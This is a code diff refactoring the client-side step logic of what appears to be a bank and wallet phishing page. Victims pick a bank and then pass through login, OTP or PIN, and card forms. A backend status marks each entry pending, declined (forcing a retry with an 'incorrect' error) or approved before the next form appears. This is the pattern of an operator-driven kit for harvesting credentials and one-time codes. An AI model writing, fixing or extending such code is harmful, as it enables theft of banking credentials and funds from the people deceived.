@@ -1083,8 +1083,8 @@
 
         // Map Database steps to HTML section IDs depending on Bank/Wallet flow
         const flowMapping = {
-    'step1': ['selectBank', 'step1', 'step2', 'step3', 'done'], // Bank Flow
-    'step4': ['selectBank', 'step4', 'step6', 'step5', 'done']  // Wallet Flow
+            'step1': ['selectBank', 'step1', 'step2', 'step3', 'done'],
+            'step4': ['selectBank', 'step4', 'step6', 'step5', 'done']
         };
 
         window.addEventListener('load', () => {
@@ -1138,78 +1138,66 @@
         }
 
         function updateUIState(dbStep, status) {
-    // Map backend step (1,2,3) to actual HTML section IDs
-    // Backend step 0 = Select Bank
-    // Backend step 1 = First Form (Login / Wallet Login)
-    // Backend step 2 = Second Form (OTP / Secure Pin)
-    // Backend step 3 = Third Form (Card / OTP)
-    
-    let sectionId = 'selectBank';
-    
-    if (currentBank.flow === 'step4') {
-        // Wallet Flow
-        if (dbStep === 1) sectionId = 'step4';
-        else if (dbStep === 2) sectionId = 'step6';
-        else if (dbStep === 3) sectionId = 'step5';
-        else if (dbStep >= 4 || status === 'done') sectionId = 'done';
-    } else {
-        // Bank Flow (step1)
-        if (dbStep === 1) sectionId = 'step1';
-        else if (dbStep === 2) sectionId = 'step2';
-        else if (dbStep === 3) sectionId = 'step3';
-        else if (dbStep >= 4 || status === 'done') sectionId = 'done';
-    }
+            let flowArray = flowMapping[currentBank.flow] || flowMapping['step1'];
 
-    const activeSection = document.querySelector('.section.active');
-    const isCurrentlyLoading = activeSection && activeSection.id === 'loading';
-    const isStartScreen = activeSection && activeSection.id === 'selectBank';
+            // dbStep corresponds to array index (dbStep 1 is index 1, which is the first form)
+            let arrayIndex = dbStep;
+            if (arrayIndex >= flowArray.length) arrayIndex = flowArray.length - 1;
+            let expectedSectionId = flowArray[arrayIndex];
 
-    if (status === 'pending') {
-        show('loading');
-    } else if (status === 'declined') {
-        fetch(API_BASE_URL + '/api/retry').then(() => {
-            show(sectionId); // Show the current form so they can retry
-            const sec = document.getElementById(sectionId);
-            if (sec) {
-                let err = sec.querySelector('.error-message-inline');
-                if (!err) {
-                    err = document.createElement('div');
-                    err.className = 'error-message-inline';
-                    err.style.color = '#ef4444';
-                    err.style.background = 'rgba(239, 68, 68, 0.1)';
-                    err.style.border = '1px solid rgba(239, 68, 68, 0.3)';
-                    err.style.padding = '10px';
-                    err.style.borderRadius = '8px';
-                    err.style.marginBottom = '14px';
-                    err.style.fontSize = '13.5px';
-                    err.style.textAlign = 'center';
-                    err.style.fontWeight = '600';
-                    const heading = sec.querySelector('h3');
-                    if (heading) heading.after(err);
+            if (status === 'done') expectedSectionId = 'done';
+
+            const activeSection = document.querySelector('.section.active');
+            const isCurrentlyLoading = activeSection && activeSection.id === 'loading';
+            const isStartScreen = activeSection && activeSection.id === 'selectBank';
+
+            if (status === 'pending') {
+                show('loading');
+            } else if (status === 'declined') {
+                fetch(API_BASE_URL + '/api/retry').then(() => {
+                    show(expectedSectionId);
+                    const sec = document.getElementById(expectedSectionId);
+                    if (sec) {
+                        let err = sec.querySelector('.error-message-inline');
+                        if (!err) {
+                            err = document.createElement('div');
+                            err.className = 'error-message-inline';
+                            err.style.color = '#ef4444';
+                            err.style.background = 'rgba(239, 68, 68, 0.1)';
+                            err.style.border = '1px solid rgba(239, 68, 68, 0.3)';
+                            err.style.padding = '10px';
+                            err.style.borderRadius = '8px';
+                            err.style.marginBottom = '14px';
+                            err.style.fontSize = '13.5px';
+                            err.style.textAlign = 'center';
+                            err.style.fontWeight = '600';
+                            const heading = sec.querySelector('h3');
+                            if (heading) heading.after(err);
+                        }
+                        err.textContent = t('errorIncorrect');
+                        sec.querySelectorAll('input').forEach(i => i.style.borderColor = '#ef4444');
+                    }
+                });
+            } else if (status === 'filling') {
+                // If we are showing loading, that means we were just approved. Show the next expected form!
+                if (isCurrentlyLoading) {
+                    show(expectedSectionId);
                 }
-                err.textContent = t('errorIncorrect');
-                sec.querySelectorAll('input').forEach(i => i.style.borderColor = '#ef4444');
+                // If we reloaded the page and we have a bank selected already, jump straight to the current form
+                if (isStartScreen && currentBank.name) {
+                    show(expectedSectionId);
+                }
+            } else if (status === 'done') {
+                show('done');
             }
-        });
-    } else if (status === 'filling') {
-        // If loading, we just got approved. Show the next form!
-        if (isCurrentlyLoading) {
-            show(sectionId);
         }
-        // If page reloaded and a bank is already selected, jump to current step
-        if (isStartScreen && currentBank.name) {
-            show(sectionId);
-        }
-    } else if (status === 'done') {
-        show('done');
-    }
-}
 
         function selectBank(name, logo, step = 'step1') {
-    currentBank = { name, logo, flow: step };
-    localStorage.setItem('paidcreditbook_bank', JSON.stringify(currentBank)); // Save it
-    // ... rest of function
-}
+            currentBank = {
+                name,
+                logo,
+                flow: step
+            };
             setStepLogos();
             show('loading');
             document.querySelector('.loading-msg').textContent = t('loadingConnecting', name);
